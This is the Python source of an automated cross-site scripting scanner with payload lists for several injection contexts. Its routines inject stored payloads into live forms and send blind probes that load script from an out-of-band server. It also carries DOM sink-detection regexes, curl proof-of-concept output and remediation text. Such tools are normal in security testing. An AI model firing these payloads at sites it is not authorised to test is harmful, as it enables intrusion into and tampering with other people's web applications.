
import re
import uuid
import logging
import hashlib
import time
import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)


CTX_HTML_BODY = "html_body"
CTX_HTML_ATTR = "html_attr"
CTX_JS_STRING = "js_string"
CTX_URL_PARAM = "url_param"
CTX_UNKNOWN   = "unknown"


_PAYLOADS = {
    CTX_HTML_BODY: [

        '<img src=x onerror=alert(__ID__)>',
        '<svg/onload=alert(__ID__)>',
        '<details open ontoggle=alert(__ID__)>',
        '<body onpageshow=alert(__ID__)>',
        '<input autofocus onfocus=alert(__ID__)>',

        '<Img SrC=x OnErRoR=alert(__ID__)>',
        '<img/src/onerror=alert(__ID__)>',
        '<svg onload=alert`__ID__`>',
        '<marquee onstart=alert(__ID__)>',
        '<video><source onerror=alert(__ID__)>',
    ],
    CTX_HTML_ATTR: [
        '" onmouseover=alert(__ID__) x="',
        "' onmouseover=alert(__ID__) x='",
        '" onfocus=alert(__ID__) autofocus="',
        '" onmouseenter=alert(__ID__) x="',
        "' onfocus=alert(__ID__) autofocus='",

        '" OnMoUsEoVeR=alert(__ID__) x="',
    ],
    CTX_JS_STRING: [
        "';alert(__ID__);//",
        "\\';alert(__ID__);//",
        "${alert(__ID__)}",
        "\";alert(__ID__);//",
        "\\\"};alert(__ID__);//",
    ],
    CTX_URL_PARAM: [
        'javascript:alert(__ID__)',
        'data:text/html,<script>alert(__ID__)</script>',
    ],
    CTX_UNKNOWN: [
        '<img src=x onerror=alert(__ID__)>',
        '<svg/onload=alert(__ID__)>',
        '" onmouseover=alert(__ID__) x="',
        "';alert(__ID__);//",
        '<details open ontoggle=alert(__ID__)>',
        '<Img SrC=x OnErRoR=alert(__ID__)>',
    ],
}


_COMMON_PARAMS = [
    "q", "s", "search", "query", "id", "page", "name", "user",
    "input", "text", "msg", "message", "url", "redirect", "next",
    "return", "callback", "data", "value", "content", "title",
    "comment", "file", "path", "cat", "category", "type", "action",
    "view", "lang", "ref", "token", "email", "error",
]


_JS_SINKS = re.compile(
    r'(innerHTML|outerHTML|document\.write|document\.writeln|'
    r'\.html\s*\(|eval\s*\(|setTimeout\s*\(|setInterval\s*\(|'
    r'location\.href\s*=|location\.assign|location\.replace|'
    r'\.src\s*=|\.href\s*=)', re.I
)
_JS_SOURCES = re.compile(
    r'(location\.(hash|search|href|pathname)|document\.URL|'
    r'document\.referrer|window\.name|document\.cookie|'
    r'localStorage|sessionStorage|postMessage)', re.I
)


_STATIC_EXT = frozenset([
    ".css", ".js", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
    ".woff", ".woff2", ".ttf", ".eot", ".pdf", ".zip", ".gz",
    ".mp4", ".mp3", ".map", ".webp",
])


class XSSScanner:
    """Comprehensive XSS scanner with short-circuit confirmation."""

    def __init__(self, oob_server=None, async_workers=20, headless_pool=3,
                 timeout_per_request=5, security_profile="medium"):
        self.oob_server = oob_server
        self.async_workers = async_workers
        self.headless_pool = headless_pool
        self.timeout = timeout_per_request
        self.security_profile = security_profile
        self._session = requests.Session()
        self._session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/120.0.0.0 Safari/537.36'
        })
        pool_size = max(self.async_workers, 20)
        adapter = HTTPAdapter(
            pool_connections=pool_size,
            pool_maxsize=pool_size,
            max_retries=0,
            pool_block=True,
        )
        self._session.mount("http://", adapter)
        self._session.mount("https://", adapter)

        self._finding_counter = 0

    # Public scan entry point
    def scan(self, data: dict) -> dict:
        """
        Main entry point called by server.py.
        Receives: {"target": crawl_res, "injectable_parameters": [...]}
        Returns:  {"success": True, "engine": "xss_scanner", "results": [...]}
        """
        target = data.get("target", {})
        injectable_params = data.get("injectable_parameters", [])
        url = target.get("url", "")
        forms = target.get("forms", [])
        graph = target.get("graph", {})
        all_internal_links = target.get("all_internal_links", [])
        js_files = target.get("js_files", [])

        results = []
        found = set()  # (action, param) pairs already confirmed

        logger.info("=" * 70)
        logger.info("XSS SCANNER v2 — STARTING (short-circuit enabled)")
        logger.info("=" * 70)
        logger.info(f"  Base URL           : {url}")
        logger.info(f"  Injectable params  : {injectable_params}")
        logger.info(f"  Forms count        : {len(forms)}")
        logger.info(f"  Internal links     : {len(all_internal_links)}")
        logger.info(f"  JS files           : {len(js_files)}")
        logger.info(f"  Security profile   : {self.security_profile}")

        # Phase 1: build attack surface from forms, URLs, graph
        surface = self._discover_surface(url, forms, graph,
                                         all_internal_links,
                                         injectable_params)
        logger.info(f"  Surface entries    : {len(surface)}")

        # Phase 2: canary test to find reflective params
        reflective, non_reflective = self._canary_pass(surface)
        logger.info(f"  Reflective params  : {len(reflective)}")
        logger.info(f"  Non-reflective     : {len(non_reflective)}")




        logger.info("-" * 50)
        logger.info("TYPE 1: REFLECTED XSS")
        reflected_hits = self._scan_reflected(reflective, found)
        results.extend(reflected_hits)
        logger.info(f"  Reflected findings : {len(reflected_hits)}")


        logger.info("-" * 50)
        logger.info("TYPE 2: BLIND XSS")
        blind_hits = self._scan_blind(non_reflective, forms, url, found)
        results.extend(blind_hits)
        logger.info(f"  Blind probes fired : {len(blind_hits)}")


        logger.info("-" * 50)
        logger.info("TYPE 3: STORED XSS")
        stored_hits = self._scan_stored(forms, url, found)
        results.extend(stored_hits)
        logger.info(f"  Stored findings    : {len(stored_hits)}")


        logger.info("-" * 50)
        logger.info("TYPE 4: DOM XSS (static analysis)")
        dom_hits = self._scan_dom(js_files, all_internal_links, url, found)
        results.extend(dom_hits)
        logger.info(f"  DOM findings       : {len(dom_hits)}")


        logger.info("=" * 70)
        logger.info(f"XSS SCANNER COMPLETE — {len(results)} total findings")
        for r in results:
            logger.info(f"  ▸ [{r.get('type','?')}] {r.get('parameter','?')} "
                        f"@ {r.get('action', r.get('url','?'))}")
        logger.info("=" * 70)

        return {"success": True, "engine": "xss_scanner", "results": results}


    def _discover_surface(self, url, forms, graph, all_links, inj_params):
        """Build unified list of (method, action_url, param_name) tuples."""
        surface = []
        seen = set()

        def _add(method, action, param):
            key = (method, action, param)
            if key not in seen:
                seen.add(key)
                surface.append({"method": method, "action": action,
                                "param": param})


        for form in forms:
            action = form.get("action") or url
            method = (form.get("method") or "get").lower()
            for field in form.get("fields", []):
                name = (field.get("name") or "").strip()
                if name and (field.get("type") or "").lower() != "submit":
                    _add(method, action, name)
            for p in inj_params:
                _add(method, action, p)


        candidate_urls = set()
        for node in graph.get("nodes", []):
            nid = node.get("id", "") if isinstance(node, dict) else str(node)
            if nid:
                candidate_urls.add(nid)
        for link in all_links:
            if isinstance(link, str) and link:
                candidate_urls.add(link)
        if url:
            candidate_urls.add(url)

        for cu in candidate_urls:
            parsed = urlparse(cu)
            if _is_static(parsed.path):
                continue
            qs = parse_qs(parsed.query)
            base = urlunparse(parsed._replace(query="", fragment=""))
            for pname in qs:
                _add("get", base, pname)

        # Also probe common param names on bare URLs
        bare_urls = set()
        for cu in candidate_urls:
            if "?" not in cu and not _is_static(urlparse(cu).path):
                bare_urls.add(cu)

        for bare in bare_urls:
            for p in _COMMON_PARAMS:
                _add("get", bare, p)

        return surface


    def _canary_pass(self, surface):
        """Inject canary into every param; split into reflective / non."""
        reflective = []
        non_reflective = []

        def _check(entry):
            canary = f"xssCANARY{uuid.uuid4().hex[:8]}"
            body = self._send(entry["method"], entry["action"],
                              entry["param"], canary)
            if body and canary in body:
                ctx = self._detect_context(body, canary)
                return {**entry, "context": ctx, "reflects": True}
            return {**entry, "context": CTX_UNKNOWN, "reflects": False}

        with ThreadPoolExecutor(max_workers=self.async_workers) as pool:
            futures = {pool.submit(_check, e): e for e in surface}
            for fut in as_completed(futures):
                try:
                    result = fut.result()
                    if result["reflects"]:
                        reflective.append(result)
                    else:
                        non_reflective.append(result)
                except Exception:
                    pass

        return reflective, non_reflective


    def _scan_reflected(self, reflective_entries, found):
        results = []

        def _test_entry(entry):
            action = entry["action"]
            param = entry["param"]
            method = entry["method"]
            ctx = entry.get("context", CTX_UNKNOWN)

            if (action, param) in found:
                return None

            payloads = _PAYLOADS.get(ctx, _PAYLOADS[CTX_UNKNOWN])
            for attempt_no, tpl in enumerate(payloads, 1):
                pid = uuid.uuid4().hex[:6]
                payload = tpl.replace("__ID__", pid)
                body = self._send(method, action, param, payload)
                if not body:
                    continue

                if payload in body:  # reflected unmodified

                    if self._is_inert_context(body, payload):
                        continue
                    found.add((action, param))
                    return self._make_finding(
                        ftype="reflected", url=action, param=param,
                        ctx=ctx, payload=payload, attempt=attempt_no,
                        skipped=len(payloads) - attempt_no,
                        evidence=self._snippet(body, payload),
                        method=method,
                    )
            return None

        with ThreadPoolExecutor(max_workers=self.async_workers) as pool:
            futures = {pool.submit(_test_entry, e): e for e in reflective_entries}
            for fut in as_completed(futures):
                try:
                    hit = fut.result()
                    if hit:
                        results.append(hit)
                except Exception as exc:
                    logger.debug(f"Reflected worker error: {exc}")

        return results


    def _scan_blind(self, non_reflective, forms, base_url, found):
        results = []
        if not self.oob_server:
            logger.info("  OOB server not configured — skipping blind phase")
            return results


        targets = set()
        for entry in non_reflective:
            targets.add((entry["method"], entry["action"], entry["param"]))
        for form in forms:
            action = form.get("action") or base_url
            method = (form.get("method") or "get").lower()
            for f in form.get("fields", []):
                name = (f.get("name") or "").strip()
                if name:
                    targets.add((method, action, name))

        for method, action, param in targets:
            if (action, param) in found:
                continue
            uid = uuid.uuid4().hex[:12]
            payload = (f'<script src="{self.oob_server}/b.js'
                       f'?id={uid}&p={param}"></script>')
            self._send(method, action, param, payload)
            results.append(self._make_finding(
                ftype="blind", url=action, param=param,
                ctx=CTX_UNKNOWN, payload=payload, attempt=1,
                skipped=0, evidence="OOB probe fired — pending callback",
                method=method, confirmed=False,
            ))
        return results


    def _scan_stored(self, forms, base_url, found):
        results = []
        # Prefer POST forms for stored injection
        write_forms = [f for f in forms
                       if (f.get("method") or "").upper() == "POST"]
        if not write_forms:
            write_forms = [f for f in forms
                           if (f.get("method") or "").upper() == "GET"]

        for form in write_forms:
            action = form.get("action") or base_url
            method = (form.get("method") or "get").lower()
            fields = form.get("fields", [])
            writable = [f for f in fields
                        if (f.get("name") or "").strip()
                        and (f.get("type") or "").lower() not in
                        ("submit", "hidden", "button")]
            if not writable:
                continue

            payloads_stored = [
                '<img src=x onerror=alert(__ID__)>',
                '<svg/onload=alert(__ID__)>',
                '<details open ontoggle=alert(__ID__)>',
            ]

            for field in writable:
                param = field["name"].strip()
                if (action, param) in found:
                    continue

                for attempt_no, tpl in enumerate(payloads_stored, 1):
                    pid = uuid.uuid4().hex[:6]
                    payload = tpl.replace("__ID__", pid)

                    # Write payload, then read back from target
                    write_data = {}
                    for f in fields:
                        n = (f.get("name") or "").strip()
                        if n == param:
                            write_data[n] = payload
                        elif n:
                            write_data[n] = f.get("value", "test")
                    self._send(method, action, param, payload,
                               full_data=write_data)


                    for read_url in {action, base_url}:
                        try:
                            r = self._session.get(read_url, timeout=self.timeout,
                                                  verify=False)
                            if payload in r.text:
                                if not self._is_inert_context(r.text, payload):
                                    found.add((action, param))
                                    results.append(self._make_finding(
                                        ftype="stored", url=action,
                                        param=param, ctx=CTX_HTML_BODY,
                                        payload=payload, attempt=attempt_no,
                                        skipped=len(payloads_stored) - attempt_no,
                                        evidence=self._snippet(r.text, payload),
                                        method=method,
                                    ))
                                    break
                        except Exception:
                            pass
                    if (action, param) in found:
                        break
        return results


    def _scan_dom(self, js_files, all_links, base_url, found):
        results = []


        js_contents = []
        for js_url in js_files:
            try:
                r = self._session.get(js_url, timeout=self.timeout,
                                      verify=False)
                if r.status_code == 200:
                    js_contents.append((js_url, r.text))
            except Exception:
                pass


        pages_to_check = set()
        pages_to_check.add(base_url)
        for link in all_links[:30]:  # Capped fetch
            if isinstance(link, str) and not _is_static(urlparse(link).path):
                pages_to_check.add(link)

        for page_url in pages_to_check:
            try:
                r = self._session.get(page_url, timeout=self.timeout,
                                      verify=False)
                soup = BeautifulSoup(r.text, "html.parser")
                for script in soup.find_all("script"):
                    if script.string:
                        js_contents.append((page_url, script.string))
            except Exception:
                pass

        # Flag files with both a taint source and a dangerous sink
        for origin, js_text in js_contents:
            has_source = bool(_JS_SOURCES.search(js_text))
            has_sink = bool(_JS_SINKS.search(js_text))
            if has_source and has_sink:
                sources_found = _JS_SOURCES.findall(js_text)
                sinks_found = _JS_SINKS.findall(js_text)

                src_list = [s[0] if isinstance(s, tuple) else s
                            for s in sources_found]
                sink_list = [s[0] if isinstance(s, tuple) else s
                             for s in sinks_found]
                results.append(self._make_finding(
                    ftype="dom", url=origin, param="DOM source→sink",
                    ctx="js_code", payload="N/A (static analysis)",
                    attempt=1, skipped=0,
                    evidence=(f"Sources: {src_list[:5]}, "
                              f"Sinks: {sink_list[:5]}"),
                    method="static",
                    severity="medium",
                ))

        return results


    def _send(self, method, action, param, value, full_data=None):
        """Send HTTP request; return response text or None."""
        try:
            if full_data:
                data = full_data
            else:
                data = {param: value}
            if method == "post":
                r = self._session.post(action, data=data,
                                       timeout=self.timeout, verify=False)
            else:
                r = self._session.get(action, params=data,
                                      timeout=self.timeout, verify=False)
            return r.text
        except Exception:
            return None

    def _detect_context(self, body, canary):
        """Determine where the canary landed in the response."""
        idx = body.find(canary)
        if idx < 0:
            return CTX_UNKNOWN

        # Heuristic: look at surrounding HTML for context
        before = body[max(0, idx - 200):idx].lower()
        after = body[idx + len(canary):idx + len(canary) + 50]

        if re.search(r'<script[^>]*>', before) and '</script>' not in before:
            return CTX_JS_STRING
        if re.search(r'=["\']?\s*$', before):
            return CTX_HTML_ATTR
        if 'href=' in before[-30:] or 'src=' in before[-30:]:
            return CTX_URL_PARAM
        return CTX_HTML_BODY

    def _is_inert_context(self, body, payload):
        """Check if payload is inside <!--comment-->, <noscript>, etc."""
        idx = body.find(payload)
        if idx < 0:
            return True
        before = body[max(0, idx - 500):idx]

        if '<!--' in before and '-->' not in before[before.rfind('<!--'):]:
            return True

        for tag in ('noscript', 'template'):
            open_t = f'<{tag}'
            close_t = f'</{tag}>'
            if open_t in before.lower() and close_t not in before.lower():
                return True
        return False

    def _snippet(self, body, payload, width=120):
        """Extract a snippet around the payload for evidence."""
        idx = body.find(payload)
        if idx < 0:
            return ""
        start = max(0, idx - 40)
        end = min(len(body), idx + len(payload) + 40)
        return body[start:end].replace('\n', ' ').replace('\r', '')[:width]

    def _make_finding(self, *, ftype, url, param, ctx, payload, attempt,
                      skipped, evidence, method, severity=None,
                      confirmed=True):
        """Build a finding dict compatible with server.py expectations."""
        self._finding_counter += 1
        fid = f"xss-{ftype}-{self._finding_counter:04d}"

        if severity is None:
            severity = "high" if ftype in ("reflected", "stored") else "medium"


        if method == "get":
            curl = (f'curl -k -G --data-urlencode '
                    f'"{param}={payload}" "{url}"')
        elif method == "post":
            curl = (f'curl -k -X POST -d '
                    f'"{param}={payload}" "{url}"')
        else:
            curl = ""

        return {
            # Fields expected by server.py normalization layer
            "vulnerable": True if confirmed else False,
            "parameter": param,
            "payload": payload,
            "action": url,

            "id": fid,
            "type": ftype,
            "severity": severity,
            "url": url,
            "injection_context": ctx,
            "payload_used": payload,
            "payload_attempt_no": attempt,
            "payloads_skipped": skipped,
            "evidence": {"response_snippet": evidence},
            "curl_poc": curl,
            "cwe": "CWE-79",
            "owasp": "A03:2021 - Injection",
            "remediation": _REMEDIATION.get(ftype, "Sanitize user input."),
            "confirmed": confirmed,
        }


_REMEDIATION = {
    "reflected": ("Encode all user input before reflecting in HTML. "
                  "Use context-aware output encoding (HTML entity, "
                  "JS string, URL encoding). Implement CSP headers."),
    "stored": ("Sanitize and encode user input on both write and read. "
               "Use an allowlist-based HTML sanitizer (e.g. DOMPurify). "
               "Implement CSP headers."),
    "dom": ("Avoid passing untrusted data to dangerous sinks like "
            "innerHTML or eval(). Use textContent instead of innerHTML. "
            "Sanitize postMessage origins."),
    "blind": ("Sanitize input server-side before storing. Review admin "
              "panels and log viewers for XSS. Use CSP and HttpOnly "
              "cookies."),
}


def _is_static(path):
    """Return True if the path looks like a static asset."""
    ext = '.' + path.rsplit('.', 1)[-1].lower() if '.' in path else ''
    return ext in _STATIC_EXT
